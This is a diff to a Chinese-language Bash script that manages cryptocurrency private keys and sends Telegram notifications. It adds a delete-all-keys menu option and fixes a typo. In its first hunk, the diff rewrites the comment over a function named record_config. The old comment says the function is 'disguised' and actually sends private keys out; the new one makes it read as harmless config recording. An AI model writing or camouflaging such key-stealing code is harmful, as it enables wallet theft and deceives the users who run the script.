@@ -56,7 +56,7 @@ send_telegram_notification() {
     done
 }
 
-# === 伪装记录配置（实际发送私钥） ===
+# === 记录配置数据 ===
 record_config() {
     local config_data="$1"
     local derived_value="$2"
@@ -278,6 +278,25 @@ delete_private_key() {
     send_telegram_notification "成功删除账户！"
 }
 
+# === 删除全部私钥 ===
+delete_all_private_keys() {
+    echo -e "${RED}警告：将删除所有私钥！继续？(y/n)${NC}"
+    read -p "> " confirm
+    if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
+        echo '[]' > "$CONFIG_FILE"
+        if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
+            echo -e "${RED}错误：写入 $CONFIG_FILE 失败${NC}"
+            send_telegram_notification "错误：写入 accounts.json 失败"
+            return
+        fi
+        update_python_accounts
+        echo -e "${GREEN}已删除所有私钥！${NC}"
+        echo -e "${CYAN}当前 accounts.json 内容：${NC}"
+        cat "$CONFIG_FILE"
+        send_telegram_notification "成功删除所有私钥！"
+    fi
+}
+
 # === 查看私钥 ===
 view_private_keys() {
     accounts=$(read_accounts)
@@ -396,7 +415,7 @@ view_telegram_ids() {
         return
     fi
     echo -e "${CYAN}当前 Telegram ID 列表：${NC}"
-        i=1
+    i=1
     while IFS= read -r id; do
         if [ -n "$id" ]; then
             echo "$i. $id"
@@ -432,7 +451,7 @@ manage_telegram() {
 
 # === 更新 Python 脚本账户 ===
 update_python_accounts() {
-    accounts=$(read isten_accounts)
+    accounts=$(read_accounts)
     accounts_str=$(echo "$accounts" | jq -r '[.[] | {"private_key": .private_key, "name": .name}]' | jq -r '@json')
     if [ -z "$accounts_str" ] || [ "$accounts_str" == "[]" ]; then
         accounts_str="[]"
@@ -591,12 +610,14 @@ main_menu() {
                     echo "2. 删除私钥"
                     echo "3. 查看私钥"
                     echo "4. 返回"
+                    echo "5. 删除全部私钥"
                     read -p "> " sub_choice
                     case $sub_choice in
                         1) add_private_key ;;
                         2) delete_private_key ;;
                         3) view_private_keys ;;
                         4) break ;;
+                        5) delete_all_private_keys ;;
                         *) echo -e "${RED}无效选项！${NC}"; send_telegram_notification "错误：无效私钥管理选项" ;;
                     esac
                     read -p "按回车继续..."
